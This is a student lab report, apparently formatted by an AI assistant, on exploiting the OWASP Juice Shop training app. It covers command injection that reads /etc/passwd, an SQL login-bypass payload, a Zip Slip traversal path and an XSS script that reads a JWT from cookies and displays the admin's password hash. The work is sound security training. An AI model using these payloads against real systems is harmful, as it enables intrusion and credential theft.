Here is your text properly formatted in **GitHub-flavored Markdown**, with clean structure, headings, and code blocks:

---

# Cybersecurity Lab Report: OWASP Juice Shop Exploitation

---

## Task 1: Basics of Command Injection

### Q1: Example Command Injection

An example command injection that prints the contents of `/etc/passwd`:

```bash
python ping_service.py "127.0.0.1; cat /etc/passwd"
```

#### Explanation

* The `;` character acts as a command separator.
* The program executes the `ping` command and then immediately executes `cat /etc/passwd`.
* Because the script uses `shell=True`, the shell interprets the separator and runs both commands.

---

### Q2: Root Causes

* **Use of `shell=True`**
  This spawns a full shell process that interprets special characters like `;`, `|`, and `&&`.

* **Lack of Input Validation**
  User input was inserted directly into an f-string without verifying that it was a valid IP address.

---

### Q3: How to Fix It

* **Disable Shell Execution**
  Pass arguments as a list:

  ```python
  ["ping", "-c", "4", target]
  ```

* **Validate Input**
  Use the `ipaddress` module in Python to ensure the input is a strictly valid IP address before execution.

---

## Task 2: SQL Injection (SQLi)

### 1. Administrative Login Bypass

Successfully bypassed the login screen to access the Administrator account without a valid password.

**Target URL:**

```
http://localhost:3000/#/login
```

**Payload:**

```
' OR 1=1 --
```

**Password:**

```
Anything
```

#### Query Logic Explanation

The backend query likely looks like:

```sql
SELECT * FROM Users WHERE email = '' OR 1=1 --' AND password = '...'
```

* `'` closes the email field.
* `OR 1=1` creates a condition that is always true, forcing the database to return the first user record (typically the Administrator).
* `--` comments out the rest of the query, effectively ignoring the password check.

---

### 2. Admin Account Data (Captured via Burp Suite)

```json
{
  "status": "success",
  "data": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500",
    "role": "admin",
    "profileImage": "assets/public/images/uploads/defaultAdmin.png"
  }
}
```

---

### 3. Product Search Injection

Verification that the search functionality is vulnerable by injecting into the query string:

```http
GET /rest/products/search?q=%27%29%29%20OR%201=1--
```

---

## Task 3: Zip Slip & Persistent XSS

### 1. Vulnerability Overview

* **Vulnerability:** Zip Slip (CWE-22) / Persistent XSS
* **Target Asset:**

  ```
  /assets/public/videos/owasp_promo.vtt
  ```

---

### 2. Exploitation Process

#### Reconnaissance

Identified the `Content-Location` header in Burp Suite pointing to:

```
/assets/public/videos/owasp_promo.mp4
```

Deduced the subtitle file was located at:

```
/assets/public/videos/owasp_promo.vtt
```

---

#### Zip Slip Construction

Created an archive with a path traversal filename to overwrite the server's subtitle file:

```bash
# Internal Path used in ZIP
../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt
```

---

#### XSS Payload

Embedded a script breakout in the `.vtt` file to steal the Administrator's JWT token and rewrite the page content.

---

### 3. The "Mallory" Script (`legal.vtt`)

```javascript
WEBVTT

00:00.000 --> 00:05.000
</script><script>
  window.addEventListener('load', () => {
    // Extracting the JWT from cookies
    const cookie = document.cookie.split('; ').find(row => row.trim().startsWith('token='));
    const token = cookie.split('=')[1];
    
    // Decoding the JWT payload to access user data
    const user = JSON.parse(atob(token.split('.')[1])).data;
    
    // Page Hijack and DOM Manipulation
    document.body.innerHTML = `
      <div style="background:white; color:black; padding:50px; text-align:center; min-height:100vh;">
        <h1>This is Mallory's web page</h1>
        <img src="/assets/public/images/uploads/${user.profileImage}" style="width:150px; border-radius:50%; border:5px solid red;">
        <h2>User: ${user.email}</h2>
        <p><strong>Password Hash:</strong> <code>${user.password}</code></p>
      </div>`;
  });
</script>
```

---

### 4. Impact

By uploading the malicious ZIP file via the **Complaints** page, the existing subtitle file was overwritten. When a user navigates to the `/promotion` page, the embedded script executes automatically.

#### Resulting Impact:

* Theft of the Administrator's credentials
* Complete transformation of the UI into **"Mallory's web page"**

---

## Proof of Compromise

* **Hacked User:** `admin@juice-sh.op`
* **Captured Password Hash:** `0192023a7bbd73250516f069df18b500`

* https://raw.githubusercontent.com/pacokui/CyberSecurityTesting101/main/5.DataInputSecurity/SCR-20260215-tcbh.png


